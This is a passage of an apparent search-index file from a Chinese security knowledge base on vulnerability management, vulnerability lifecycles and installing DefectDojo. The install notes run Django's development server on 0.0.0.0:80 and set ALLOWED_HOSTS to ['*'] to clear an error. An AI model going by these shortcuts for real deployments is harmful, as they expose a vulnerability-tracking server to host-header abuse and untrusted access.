\u57fa\u4e8eDREAD\u6a21\u578b\u7684\u6f0f\u6d1e\u7b49\u7ea7\u8ba1\u7b97 \u5f00\u6e90\u6f0f\u6d1e\u7ba1\u7406\u7cfb\u7edf SRCMS \u6d1e\u5bdf defectdojo","title":"\u6f0f\u6d1e\u7ba1\u7406"},{"location":"application-security/vulnerability-management/#_1","text":"\u8ba1\u7b97\u673a\u5b89\u5168\u9690\u60a3(vulnerability)\u4fd7\u79f0\u6f0f\u6d1e(security hole)\uff0c\u6307\u8ba1\u7b97\u673a\u7cfb\u7edf\u5b89\u5168\u65b9\u9762\u7684\u7f3a\u9677\uff0c\u4f7f\u5f97\u7cfb\u7edf\u6216\u5176\u5b83\u5e94\u7528\u6570\u636e\u7684\u4fdd\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u3001\u53ef\u7528\u6027\u3001\u8bbf\u95ee\u63a7\u5236\u548c\u76d1\u6d4b\u673a\u5236\u7b49\u9762\u4e34\u5a01\u80c1\u3002 \u6f0f\u6d1e\u7ba1\u7406\u5c31\u662f\u9886\u5148\u6f0f\u6d1e\u4e00\u6b65\uff0c\u8ba9\u4fee\u590d\u66f4\u9891\u7e41\u66f4\u6709\u6548\u7684\u4e00\u4e2a\u8fc7\u7a0b\u3002 \u5f53\u516c\u53f8\u4e1a\u52a1\u8f83\u5c11\u65f6\uff0c\u4e00\u4e2a\u8868\u683c\u5c31\u53ef\u4ee5\u5904\u7406\u5b8c\u6f0f\u6d1e\u7ba1\u7406\u7684\u6d41\u7a0b\u3002\u4f46\u662f\u5f53\u4e1a\u52a1\u7cfb\u7edf\u589e\u591a\uff0c\u5b89\u5168\u62a5\u544a\u589e\u5927\u65f6\u5c31\u9700\u8981\u4e00\u4e2a\u597d\u7684\u6f0f\u6d1e\u7ba1\u7406\u5de5\u5177\u6765\u8fdb\u884c\u7ba1\u7406\u3002 \u629b\u4e00\u4e2a\u95ee\u9898\uff1a\u5b89\u5168\u6d4b\u8bd5\u56e2\u961f\u5230\u5e95\u5e94\u4e0d\u5e94\u8be5\u4e3a\u6f0f\u6d1e\u6570\u91cf\u8d1f\u8d23\uff0c\u5982\u679c\u9700\u8981\u8d1f\u8d23\uff0c\u90a3\u4e48\u591a\u597d\u8fd8\u662f\u5c11\u597d\uff1f","title":"\u6f0f\u6d1e\u7ba1\u7406"},{"location":"application-security/vulnerability-management/#_2","text":"","title":"\u6f0f\u6d1e\u751f\u547d\u5468\u671f\u7ba1\u7406"},{"location":"application-security/vulnerability-management/#_3","text":"\u5185\u90e8\u5b89\u5168\u56e2\u961f\u53d1\u73b0\uff1a\u901a\u8fc7\u5b89\u5168\u626b\u63cf\u3001\u5b89\u5168\u6d4b\u8bd5\u7b49\u624b\u6bb5\u53d1\u73b0\u6f0f\u6d1e\uff1b \u5185\u90e8\u975e\u5b89\u5168\u56e2\u961f\u53d1\u73b0\uff1a\u5de5\u4f5c\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u7684\u5b89\u5168\u95ee\u9898\uff1b \u5916\u90e8\u53d1\u73b0\uff1a\u4f17\u6d4b\u5e73\u53f0\u3001\u5b89\u5168\u670d\u52a1\u3001\u4e2a\u4eba\u63d0\u4ea4\uff1b","title":"\u6f0f\u6d1e\u7684\u6765\u6e90"},{"location":"application-security/vulnerability-management/#_4","text":"\u6f0f\u6d1e\u5982\u4f55\u4e0e\u5177\u4f53\u4e1a\u52a1\u5173\u8054 \u5f53\u516c\u53f8\u89c4\u6a21\u8f83\u5c0f\u6c9f\u901a\u9760\u55d3\u95e8\u7684\u65f6\u5019\u4e0d\u7528\u8003\u8651\u8fd9\u4e2a\u95ee\u9898\uff0c\u800c\u4e14\u4e1a\u52a1\u56e2\u961f\u5212\u5206\u4e5f\u6ca1\u6709\u5f88\u6e05\u6670\u6240\u4ee5\u8fd9\u4e2a\u65f6\u5019\u53ef\u4ee5\u76f4\u63a5\u4e22\u7ed9\u4e1a\u52a1\u65b9\u8ba9\u4ed6\u4eec\u5b89\u6392\u4fee\u590d\u3002\u5f53\u516c\u53f8\u8fbe\u5230\u4e00\u5b9a\u89c4\u6a21\u4e1a\u52a1\u589e\u591a\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5982\u679c\u5355\u7eaf\u4f9d\u9760\u4eba\u529b\u6765\u627e\u6f0f\u6d1e\u5c5e\u4e8e\u54ea\u4e2a\u4e1a\u52a1\u662f\u5f88\u8d39\u529b\u7684\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5176\u5b9e\u5f88\u9700\u8981\u5b89\u5168\u7684\u8d44\u4ea7\u7ba1\u7406\u6765\u76f4\u63a5\u5b9a\u4f4d\u5230\u4e1a\u52a1\u65b9\uff0c\u518d\u6765\u627e\u5230\u5173\u8054\u7684\u4eba\uff0c\u5f53\u7136\u5b89\u5168\u8d44\u4ea7\u7ba1\u7406\u4e0d\u662f\u672c\u7bc7\u7684\u8ba8\u8bba\uff0c\u540e\u9762\u4f1a\u6709\u4e00\u7bc7\u4e13\u95e8\u6765\u4ecb\u7ecd\u3002 \u89e3\u51b3\u65b9\u6848\uff1a\u6f0f\u6d1e\u7ba1\u7406\u7cfb\u7edf\u4e0e\u8d44\u4ea7\u7ba1\u7406\u7cfb\u7edf\u90e8\u5206\u6570\u636e\u6253\u901a\u3002 \u786e\u4fdd\u6f0f\u6d1e\u4fee\u590d\u5b8c\u6210 \u5728\u5f88\u591a\u516c\u53f8\u9047\u5230\u8fc7\u4e00\u4e2a\u60c5\u51b5\uff1a\u4e25\u91cd\u9ad8\u5371\u7684\u6f0f\u6d1e\u8fd8\u597d\uff0c\u4f46\u662f\u7ecf\u5e38\u51fa\u73b0\u4e2d\u4f4e\u5371\u7684\u6f0f\u6d1e\u63d0\u4ea4\u4e00\u4e2a\u6708\u751a\u81f3\u534a\u5e74\u6ca1\u6709\u4fee\u590d\u3002 \u89e3\u51b3\u65b9\u6848\uff1a\u5b89\u5168\u8bed\u4e1a\u52a1\u7edf\u4e00\u5236\u5b9a\u4e00\u4e2a\u6f0f\u6d1e\u751f\u547d\u5468\u671f\u7ba1\u7406\u6807\u51c6\uff0c\u4e0d\u540c\u7b49\u7ea7\u7684\u6f0f\u6d1e\u4fee\u590d\u65f6\u95f4\u662f\u591a\u4e45\u3002 \u6f0f\u6d1e\u62a5\u544a\u7684\u7559\u5b58 \u4f01\u4e1a\u5185\u90e8\u9700\u8981\u5bf9\u6f0f\u6d1e\u6709\u4e00\u4e2a\u6e05\u6670\u7684\u6574\u7406\u5f52\u6863\u6765\u4f5c\u4e3a\u6570\u636e\u7eac\u5ea6\u5c55\u793a\u516c\u53f8\u5b89\u5168\u53d1\u5c55\u7684\u72b6\u6001\u3002\u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\u53d1\u73b0\u6f0f\u6d1e\u9700\u8981\u90ae\u4ef6\u7ed9\u4e1a\u52a1\u65b9\uff0c\u5e76\u4e14\u9700\u8981\u4f7f\u7528Excel\u6765\u603b\u7ed3\uff0c\u5f53\u6d4b\u8bd5\u4eba\u5458\u5f88\u591a\u65f6\uff0c\u8fd8\u9700\u8981\u505a\u4e00\u4e2a\u6c47\u603b\uff0c\u8fd9\u4e9b\u90fd\u4f1a\u9020\u6210\u66f4\u591a\u7684\u4e0d\u4fbf\u3002 \u89e3\u51b3\u65b9\u6848\uff1a\u6f0f\u6d1e\u7ba1\u7406\u5e73\u53f0\u9700\u8981\u5bf9\u4e0d\u540c\u65f6\u95f4\u6bb5\u63d0\u4ea4\u7684\u4e0d\u540c\u6f0f\u6d1e\u7b49\u7ea7\u8fdb\u884c\u6570\u636e\u91cf\u5316\u3002 \u540c\u4e00\u4e2a\u4e1a\u52a1\u56e2\u961f\u8d1f\u8d23\u7684\u4ea7\u54c1\u4e2d\u591a\u6b21\u51fa\u73b0\u540c\u6837\u7684\u6f0f\u6d1e \u89e3\u51b3\u65b9\u6848\uff1a\u4e1a\u52a1\u56e2\u961f\u81ea\u8eab\u7684\u4e0d\u65ad\u6574\u7406\u4e0e\u603b\u7ed3\uff0c\u5b89\u5168\u56e2\u961f\u5bf9\u4e1a\u52a1\u56e2\u961f\u8fdb\u884c\u5b89\u5168\u57f9\u8bad\uff08\u53ef\u4ee5\u7ed3\u5408\u5728SDL\u4e2d\u8fdb\u884c\uff09\u3002 \u6f0f\u6d1e\u5ba1\u6838\u4eba\u529bDoS \u5982\u679c\u4f01\u4e1a\u5728\u4e00\u4e9b\u7c7b\u4f3cSRC\u7684\u5e73\u53f0\uff0c\u7531\u4e8e\u76ee\u524d\u767d\u5e3d\u5b50\u6c34\u5e73\u5c42\u6b21\u4e0d\u9f50\uff0c\u7ecf\u5e38\u4f1a\u63d0\u4ea4\u4e00\u4e9bbug\u4f5c\u4e3a\u6f0f\u6d1e\uff0c\u6216\u8005\u6545\u610f\u63d0\u9ad8\u6f0f\u6d1e\u7b49\u7ea7\uff0cSRC\u5e73\u53f0\u5728\u5904\u7406\u8fd9\u4e9b\u65f6\u4e0e\u767d\u5e3d\u5b50\u53d1\u751f\u4e89\u6267\u4ea7\u751f\u7684\u4eba\u529b\u6d88\u8017\u3002 \u89e3\u51b3\u65b9\u6848\uff1a\u5f85\u89e3\u51b3","title":"\u6f0f\u6d1e\u7ba1\u7406\u7684\u95ee\u9898"},{"location":"application-security/vulnerability-management/#_5","text":"","title":"\u6f0f\u6d1e\u7ba1\u7406\u7684\u601d\u8003"},{"location":"application-security/vulnerability-management/#_6","text":"\u539f\u6587\u5730\u5740 \u5907\u6ce8\uff1a\u672c\u8282\u5185\u5bb9\u5f15\u7528\u81ea\u5b89\u5168\u6f0f\u6d1e\u751f\u547d\u5468\u671f\u7684\u7406\u89e3\uff0c\u975e\u539f\u521b \u4ece\u4ea7\u54c1\u89d2\u5ea6\u7406\u89e3\u5b89\u5168\u6f0f\u6d1e\u751f\u547d\u5468\u671f \u6f0f\u6d1e\u53d1\u73b0\uff1a\u901a\u8fc7\u4eba\u5de5\u6216\u8005\u81ea\u52a8\u5316\u7b49\u65b9\u5f0f\u5206\u6790\u3001\u6316\u6398\u51fa\u6f0f\u6d1e\u7684\u8fc7\u7a0b\uff0c\u5e76\u4e14\u8be5\u6f0f\u6d1e\u53ef\u4ee5\u88ab\u9a8c\u8bc1\u548c\u91cd\u73b0\uff1b \u6f0f\u6d1e\u5229\u7528\uff1a\u5229\u7528\u6f0f\u6d1e\u5bf9\u8ba1\u7b97\u673a\u4fe1\u606f\u7cfb\u7edf\u7684\u4fdd\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u548c\u53ef\u7528\u6027\u9020\u6210\u635f\u5bb3\u7684\u8fc7\u7a0b\uff1b \u6f0f\u6d1e\u4fee\u590d\uff1a\u901a\u8fc7\u8865\u4e01\u3001\u5347\u7ea7\u7248\u672c\u6216\u914d\u7f6e\u7b56\u7565\u7b49\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u4fee\u8865\u7684\u8fc7\u7a0b\uff0c\u4f7f\u5f97\u8be5\u6f0f\u6d1e\u4e0d\u80fd\u591f\u88ab\u6076\u610f\u4e3b\u9898\u6240\u5229\u7528\uff1b \u6f0f\u6d1e\u516c\u5f00\uff1a\u901a\u8fc7\u516c\u5f00\u6e20\u9053\uff08\u5982\uff1a\u7f51\u7ad9\u3001\u90ae\u4ef6\u5217\u8868\u7b49\uff09\uff1b \u4ece\u4fe1\u606f\u7cfb\u7edf\u89d2\u5ea6\u7406\u89e3\u5b89\u5168\u6f0f\u6d1e\u751f\u547d\u5468\u671f \u6f0f\u6d1e\u8bc6\u522b\uff1a\u901a\u8fc7\u81ea\u8eab\u6d4b\u8bd5\u3001\u76d1\u63a7\u3001\u5916\u90e8\u7b2c\u4e09\u65b9\u901a\u62a5\u3001\u5ba2\u6237\u6295\u8bc9\u7b49\u65b9\u5f0f\uff0c\u83b7\u77e5\u6f0f\u6d1e\u7684\u5b58\u5728\uff1b \u6f0f\u6d1e\u8bc4\u4f30\uff1a\u901a\u8fc7\u81ea\u8eab\u6d4b\u8bd5\u3001\u76d1\u63a7\u3001\u5916\u90e8\u7b2c\u4e09\u65b9\u901a\u62a5\u3001\u5ba2\u6237\u6295\u8bc9\u7b49\u65b9\u5f0f\uff0c\u83b7\u77e5\u6f0f\u6d1e\u7684\u5b58\u5728\uff1b \u6f0f\u6d1e\u901a\u62a5\uff1a\u5b89\u5168\u7ba1\u7406\u8005\u5c06\u6f0f\u6d1e\u4fe1\u606f\u548c\u4fee\u590d\u5efa\u8bae\u5185\u90e8\u901a\u62a5\u7ed9\u4fe1\u606f\u7cfb\u7edf\u7ef4\u62a4/\u5e94\u7528/\u5f00\u53d1\u7b49\u76f8\u5173\u4eba\u5458\uff1b \u6f0f\u6d1e\u6d4b\u8bd5\uff1a\u4fe1\u606f\u7cfb\u7edf\u76f8\u5173\u4eba\u5458\u5bf9\u7cfb\u7edf\u6f0f\u6d1e\u4fee\u8865\u8fdb\u884c\u6d4b\u8bd5\uff1b \u6f0f\u6d1e\u4fee\u590d\uff1a\u4fe1\u606f\u7cfb\u7edf\u76f8\u5173\u4eba\u5458\u5bf9\u7cfb\u7edf\u6f0f\u6d1e\u8fdb\u884c\u4fee\u590d\uff1b \u6f0f\u6d1e\u56de\u9000\uff1a\u6f0f\u6d1e\u7684\u4fee\u590d\u82e5\u5f71\u54cd\u4e1a\u52a1\uff0c\u5bf9\u4fee\u590d\u8fdb\u884c\u56de\u9000\uff0c\u591a\u65b9\u91cd\u65b0\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u8bc4\u4f30\uff0c\u751a\u81f3\u63a5\u53d7\u8be5\u6f0f\u6d1e\uff1b \u4ece\u5b89\u5168\u653b\u9632\u89d2\u5ea6\u7406\u89e3\u5b89\u5168\u6f0f\u6d1e\u751f\u547d\u5468\u671f \u6f0f\u6d1e\u7814\u7a76\u4e0e\u6316\u6398\uff1a\u5229\u7528\u6e90\u4ee3\u7801\u5ba1\u6838\uff08\u767d\u76d2\u6d4b\u8bd5\uff09\u3001\u9006\u5411\u5de5\u7a0b\uff08\u7070\u76d2\u6d4b\u8bd5\uff09\u3001Fuzz\u6d4b\u8bd5\uff08\u9ed1\u76d2\u6d4b\u8bd5\uff09\u3001\u6d41\u91cf\u5206\u6790\uff08\u9ed1\u76d2\u6d4b\u8bd5\uff09\u7b49\u65b9\u6cd5\uff1b POC/EXP\u5f00\u53d1\u4e0e\u6d4b\u8bd5\uff1a\u5f00\u53d1\u6982\u5ff5\u9a8c\u8bc1\u6027\u6e17\u900f\u653b\u51fb\u4ee3\u7801\uff08POC\uff09\u6216\u6f0f\u6d1e\u653b\u51fb\u5229\u7528\u4ee3\u7801\uff08EXP\uff09\uff0c\u5e76\u6d4b\u8bd5\u6f0f\u6d1e\u662f\u5426\u53ef\u88ab\u5229\u7528\uff1b \u901a\u62a5\u5382\u5546\u6216\u5c0f\u89c4\u6a21\u6d41\u4f20\uff1a\u767d\u5e3d\u5b50\u901a\u77e5\u5382\u5546\u8fdb\u884c\u4fee\u8865\uff0c\u7ed9\u51fa\u8865\u4e01\u540e\u516c\u5e03\uff1b\u9ed1\u5e3d\u5b50\u5728\u5c01\u95ed\u5c0f\u89c4\u6a21\u56e2\u961f\u5171\u4eab\u6d41\u4f20\uff1b \u6f0f\u6d1e\u6269\u6563\uff1a\u6f0f\u6d1ePOC\u6216EXP\u4ee3\u7801\u5728\u4e92\u8054\u7f51\u4e0a\u516c\u5e03\uff0c\u5927\u4f17\u9ed1\u5e3d\u5b50\u5feb\u901f\u638c\u63e1\u3001\u5e94\u7528\u548c\u4f20\u64ad\u6269\u6563\uff1b \u653b\u51fb\u5de5\u5177/\u6076\u610f\u7a0b\u5e8f\u4f20\u64ad\uff1a\u5f00\u53d1\u51fa\u81ea\u52a8\u5316\u653b\u51fb\u5de5\u5177/\u6076\u610f\u7a0b\u5e8f\uff0c\u5728\u4e92\u8054\u7f51\u8fdb\u884c\u4f20\u64ad\u3002\u5382\u5546\u5b8c\u6210\u8865\u4e01\u7a0b\u5e8f\u5f00\u53d1\u548c\u6d4b\u8bd5\u5e76\u8fdb\u884c\u53d1\u5e03\uff1b \u5927\u89c4\u6a21\u4f20\u64ad\uff1a\u5382\u5546\u53d1\u5e03\u8865\u4e01\u7a0b\u5e8f\u548c\u5b89\u5168\u8b66\u62a5\uff0c\u6e17\u900f\u4ee3\u7801/\u6076\u610f\u7a0b\u5e8f\u5927\u89c4\u6a21\u4f20\u64ad\u5371\u5bb3\u4e92\u8054\u7f51\uff1b \u6f0f\u6d1e/\u653b\u51fb\u4ee3\u7801\u9010\u6e10\u6d88\u4ea1\uff1a\u5728\u5382\u5546\u8865\u4e01\u7a0b\u5e8f\u5e7f\u6cdb\u5e94\u7528\u540e\uff0c\u76f8\u5e94\u7684\u6f0f\u6d1e\u6e17\u900f\u4ee3\u7801/\u6076\u610f\u7a0b\u5e8f\u9010\u6e10\u629b\u5f03\u4ece\u800c\u6d88\u4ea1\uff1b","title":"\u5b89\u5168\u6f0f\u6d1e\u751f\u547d\u5468\u671f\u7684\u7406\u89e3"},{"location":"application-security/vulnerability-management/#_7","text":"\u5bf9\u4e8e\u4f01\u4e1a\uff0c\u6211\u4eec\u5e94\u8be5\u5173\u6ce8\u4e0e\u4f01\u4e1a\u5185\u90e8\u76f8\u5173\uff0c\u751a\u81f3\u5173\u6ce8\u6211\u4eec\u6240\u4f7f\u7528\u7684\u4ea7\u54c1\u3001\u670d\u52a1\u76f8\u5173\u7684\u6f0f\u6d1e\u3002\u4ece\u6f0f\u6d1e\u7206\u53d1\u3001\u6f0f\u6d1e\u4f20\u64ad\u3001\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\u4f20\u64ad\u5230\u6f0f\u6d1e\u4fee\u590d\u6574\u4e2a\u6d41\u7a0b\u4e2d\uff0c\u6211\u4eec\u5e94\u8be5\u601d\u8003\u5982\u4e0b\u51e0\u4e2a\u95ee\u9898\uff1a \u5982\u4f55\u5feb\u901f\u83b7\u53d6\u6f0f\u6d1e\u60c5\u62a5\uff1a\u722c\u866b\u3001\u60c5\u62a5\u7fa4\u3001\u793e\u533a\u7f51\u7ad9\u7b49\uff1b \u6f0f\u6d1e\u60c5\u62a5\u5982\u4f55\u8bc4\u4f30\u5f71\u54cd\uff1a\u516c\u53f8\u5185\u6709\u591a\u5c11\u4e1a\u52a1\u53d7\u5230\u5f71\u54cd\uff1b \u6f0f\u6d1e\u5229\u7528\u7206\u53d1\u65f6\u7684\u89e3\u51b3\u65b9\u6848\uff1a\u6f0f\u6d1e\u8be6\u60c5\u662f\u5426\u6709\u7ed9\u51fa\u4e34\u65f6\u89e3\u51b3\u65b9\u6848\uff1b\u6ca1\u6709\u4e34\u65f6\u89e3\u51b3\u65b9\u6848\u5982\u4f55\u63a7\u5236\u98ce\u9669\uff1b \u6f0f\u6d1e\u4fee\u590d\u65f6\u7684\u98ce\u9669\u8bc4\u4f30\uff1a\u4fee\u590d\u65b9\u6848\u5bf9\u4e1a\u52a1\u5f71\u54cd\u662f\u5426\u53ef\u4ee5\u63a5\u53d7\uff1b \u6f0f\u6d1e\u4fee\u590d\u5b8c\u6210\u5982\u4f55\u505a\u5230\u6301\u7eed\u76d1\u63a7\uff1a\u9632\u6b62\u6f0f\u6d1e\u7684\u91cd\u590d\u51fa\u73b0\uff1b \u4e59\u65b9\u4ea7\u54c1\u7684\u6f0f\u6d1e\u751f\u547d\u5468\u671f\u7ba1\u7406 \u5f00\u6e90\u4ea7\u54c1\u7684\u6f0f\u6d1e\u751f\u547d\u5468\u671f\u7ba1\u7406","title":"\u6211\u7684\u4e00\u4e9b\u601d\u8003"},{"location":"application-security/vulnerability-management/#_8","text":"\u7532\u65b9\u4f01\u4e1a\u6f0f\u6d1e\u7ba1\u7406\u6d3b\u52a8\u768450\u4e2a\u75db\u70b9\u603b\u7ed3 \u6f0f\u6d1e\u7ba1\u7406\u7684\u5b9a\u4e49\u4e0e\u6700\u4f73\u5b9e\u8df5 The Five Stages of Vulnerability Management \u57fa\u4e8eDREAD\u6a21\u578b\u7684\u6f0f\u6d1e\u7b49\u7ea7\u8ba1\u7b97","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/vulnerability-management/#_9","text":"SRCMS \u6d1e\u5bdf defectdojo","title":"\u5f00\u6e90\u6f0f\u6d1e\u7ba1\u7406\u7cfb\u7edf"},{"location":"application-security/vulnerability-management/vm-tools-defectdojo/","text":"defectdojo DefectDojo\uff1a\u5f00\u6e90\u5e94\u7528\u7a0b\u5e8f\u6f0f\u6d1e\u5173\u8054\u548c\u5b89\u5168\u7f16\u6392\u5de5\u5177\u3002 github\u5730\u5740 \u5b89\u88c5\u4e0e\u914d\u7f6e # \u64cd\u4f5c\u7cfb\u7edf\uff1aCentos7 # \u4e0b\u8f7d git clone https://github.com/DefectDojo/django-DefectDojo # \u8fdb\u5165\u76ee\u5f55\u5e76\u6267\u884c cd django-DefectDojo ./setup.bash # \u6570\u636e\u5e93\u9009\u62e9mysql\uff0c\u4e0d\u7528\u81ea\u5df1\u5b89\u88c5\uff0c\u5b89\u88c5\u8fdb\u884c\u4f1a\u5e2e\u4f60\u5b89\u88c5\u597d # \u5df2\u77e5\u786e\u8ba4\u4e0b\u53bb\uff0c\u76f4\u5230\u51fa\u73b0\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f # \u542f\u52a8\u6570\u636e\u5e93 systemctl start mariadb.service # \u914d\u7f6e\u6570\u636e\u5e93\u8d26\u53f7\u5bc6\u7801 mysql_secure_installation # \u914d\u7f6e\u540e\u53f0\u7ba1\u7406\u8d26\u53f7\u5bc6\u7801 # \u542f\u52a8\u670d\u52a1 python manage.py runserver 0.0.0.0:80 # \u6b64\u65f6\u8bbf\u95ee\u4f1a\u62a5\u9519 # \u89e3\u51b3\u65b9\u6848\uff0c\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u7b2c68\u884c vim django-DefectDojo/dojo/settings/settings.py # ALLOWED_HOSTS = [] # \u6ce8\u91ca\u8fd9\u4e00\u884c ALLOWED_HOSTS = ['*'] # \u6dfb\u52a0\u8fd9\u4e00\u884c # \u91cd\u542f\u670d\u52a1 \u4f7f\u7528\u5fc3\u5f97 \u6838\u5fc3\u5185\u5bb9 \u4ea7\u54c1\u7ba1\u7406 \u65b0\u589e\u4ea7\u54c1 \u4ea7\u54c1\u7c7b\u578b\uff1a \u9879\u76ee\u7ba1\u7406 \u4ea7\u54c1\u65b0\u589e\u9879\u76ee\uff1a \u6d4b\u8bd5\u7c7b\u578b\uff1a \u73af\u5883\u7ba1\u7406\uff1a \u65b0\u589e\u6d4b\u8bd5\uff1a \u65b0\u589e\u6f0f\u6d1e\uff1a \u7528\u6237\u7ba1\u7406 \u6807\u51c6\u7684Django\u7ba1\u7406\u7528\u6237\u65b9\u5f0f\u3002 \u4ea7\u54c1\u8bc4\u4ef7 \u7f3a\u70b9 \u4e0d\u652f\u6301\u4e2d\u6587\u771f\u7684\u5f88\u5751\uff0c\u9700\u8981\u6c49\u5316\uff1b Python Django\u7684\u6846\u67b6\uff0c\u6709\u5f88\u591a\u9700\u8981\u8e29\u5751\u7684\u5730\u65b9\uff0c\u6211\u8fd9\u91cc\u8e29\u4e00\u4e9b\uff0c\u5927\u5bb6\u53ef\u4ee5\u8865\u5145\uff1b \u7cfb\u7edf\u6574\u4f53\u67b6\u6784\u4e0d\u9002\u5408\u56fd\u4eba\u7b80\u5355\u6613\u7528\u7684\u4e60\u60ef\uff1b \u2026\u2026 \u4f18\u70b9 \u5b8c\u5584\u7684\u4efb\u52a1\u5206\u914d\u7cfb\u7edf\uff0c\u4e0d\u540c\u4efb\u52a1\u5206\u914d\u7ed9\u4e0d\u540c\u4eba\u5458\u8fdb\u884c\u6d4b\u8bd5\uff1b \u5bf9\u4e0d\u540c\u4ea7\u54c1\u3001\u4e0d\u540c\u9879\u76ee\u8fdb\u884c\u7ba1\u7406\uff0c\u53ef\u4ee5\u67e5\u770b\u5404\u81ea\u7684\u6f0f\u6d1e\u60c5\u51b5\uff1b \u652f\u6301LDAP\u3001JIRA\u96c6\u6210\uff1b \u2026\u2026 \u8e29\u5751\u8bb0 \u4e2d\u6587\u4e71\u7801 \u5728defectdojo\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u914d\u7f6e\u6570\u636e\u5e93\u4fe1\u606f\u4e4b\u524d\uff0c\u4e5f\u5c31\u662f\u542f\u52a8MySQL\u6570\u636e\u5e93\u65f6\uff0c\u9700\u8981\u4fee\u6539MySQL\u914d\u7f6e\u6587\u4ef6\uff1a vim /etc/my.cnf # [mysqld] \u4e0b\u9762\u6dfb\u52a0\u4ee5\u4e0b\u4e09\u884c character-set-server=utf8 collation-server=utf8_general_ci skip-character-set-client-handshake # \u91cd\u542fMySQL\u670d\u52a1 \u65b0\u589e\u6f0f\u6d1e\u65f6\uff0c\u6f0f\u6d1e\u540d\u79f0\u4e3a\u4e2d\u6587\u65f6\u62a5\u9519 \u5907\u6ce8\uff1a\u8fd9\u91cc\u867d\u7136\u62a5\u9519\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u65b0\u589e\u6f0f\u6d1e\u6210\u529f \u5982\u4f55\u89e3\u51b3\u8fd9\u4e2a\u62a5\u9519\u95ee\u9898 vim django-DefectDojo/dojo/models.py # \u8df3\u8f6c\u52301049\u884c # hash_string = hash_string.decode('utf-8').strip() # \u6ce8\u91ca\u6b64\u884c hash_string = hash_string.strip() # \u65b0\u589e\u6b64\u884c \u6c49\u5316Django vim django-DefectDojo/dojo/settings/settings.py # \u641c\u7d22LANGUAGE_CODE\uff0c\u4fee\u6539\u4e3a\u5982\u4e0b LANGUAGE_CODE = 'zh-Hans' \u53c2\u8003\u8d44\u6599 Django Authentication Using LDAP \u5f00\u6e90\u6f0f\u6d1e\u7ba1\u7406\u5de5\u5177DefectDojo\uff08\u4e8c\uff09\u4f7f\u7528\u6307\u5357\uff1a\u57fa\u672c\u4f7f\u7528","title":"defectdojo"},{"location":"application-security/vulnerability-management/vm-tools-defectdojo/#defectdojo","text":"DefectDojo\uff1a\u5f00\u6e90\u5e94\u7528\u7a0b\u5e8f\u6f0f\u6d1e\u5173\u8054\u548c\u5b89\u5168\u7f16\u6392\u5de5\u5177\u3002 github\u5730\u5740","title":"defectdojo"},{"location":"application-security/vulnerability-management/vm-tools-defectdojo/#_1","text":"# \u64cd\u4f5c\u7cfb\u7edf\uff1aCentos7 # \u4e0b\u8f7d git clone https://github.com/DefectDojo/django-DefectDojo # \u8fdb\u5165\u76ee\u5f55\u5e76\u6267\u884c cd django-DefectDojo ./setup.bash # \u6570\u636e\u5e93\u9009\u62e9mysql\uff0c\u4e0d\u7528\u81ea\u5df1\u5b89\u88c5\uff0c\u5b89\u88c5\u8fdb\u884c\u4f1a\u5e2e\u4f60\u5b89\u88c5\u597d # \u5df2\u77e5\u786e\u8ba4\u4e0b\u53bb\uff0c\u76f4\u5230\u51fa\u73b0\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f # \u542f\u52a8\u6570\u636e\u5e93 systemctl start mariadb.service # \u914d\u7f6e\u6570\u636e\u5e93\u8d26\u53f7\u5bc6\u7801 mysql_secure_installation # \u914d\u7f6e\u540e\u53f0\u7ba1\u7406\u8d26\u53f7\u5bc6\u7801 # \u542f\u52a8\u670d\u52a1 python manage.py runserver 0.0.0.0:80 # \u6b64\u65f6\u8bbf\u95ee\u4f1a\u62a5\u9519 # \u89e3\u51b3\u65b9\u6848\uff0c\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u7b2c68\u884c vim django-DefectDojo/dojo/settings/settings.py # ALLOWED_HOSTS = [] # \u6ce8\u91ca\u8fd9\u4e00\u884c ALLOWED_HOSTS = ['*'] # \u6dfb\u52a0\u8fd9\u4e00\u884c # \u91cd\u542f\u670d\u52a1","title":"\u5b89\u88c5\u4e0e\u914d\u7f6e"},{"location":"application-security/vulnerability-management/vm-tools-defectdojo/#_2","text":"","title":"\u4f7f\u7528\u5fc3\u5f97"},{"location":"application-security/vulnerability-management/vm-tools-defectdojo/#_3","text":"\u4ea7\u54c1\u7ba1\u7406 \u65b0\u589e\u4ea7\u54c1 \u4ea7\u54c1\u7c7b\u578b\uff1a \u9879\u76ee\u7ba1\u7406 \u4ea7\u54c1\u65b0\u589e\u9879\u76ee\uff1a \u6d4b\u8bd5\u7c7b\u578b\uff1a \u73af\u5883\u7ba1\u7406\uff1a \u65b0\u589e\u6d4b\u8bd5\uff1a \u65b0\u589e\u6f0f\u6d1e\uff1a \u7528\u6237\u7ba1\u7406 \u6807\u51c6\u7684Django\u7ba1\u7406\u7528\u6237\u65b9\u5f0f\u3002","title":"\u6838\u5fc3\u5185\u5bb9"},{"location":"application-security/vulnerability-management/vm-tools-defectdojo/#_4","text":"\u7f3a\u70b9 \u4e0d\u652f\u6301\u4e2d\u6587\u771f\u7684\u5f88\u5751\uff0c\u9700\u8981\u6c49\u5316\uff1b Python Django\u7684\u6846\u67b6\uff0c\u6709\u5f88\u591a\u9700\u8981\u8e29\u5751\u7684\u5730\u65b9\uff0c\u6211\u8fd9\u91cc\u8e29\u4e00\u4e9b\uff0c\u5927\u5bb6\u53ef\u4ee5\u8865\u5145\uff1b \u7cfb\u7edf\u6574\u4f53\u67b6\u6784\u4e0d\u9002\u5408\u56fd\u4eba\u7b80\u5355\u6613\u7528\u7684\u4e60\u60ef\uff1b \u2026\u2026 \u4f18\u70b9 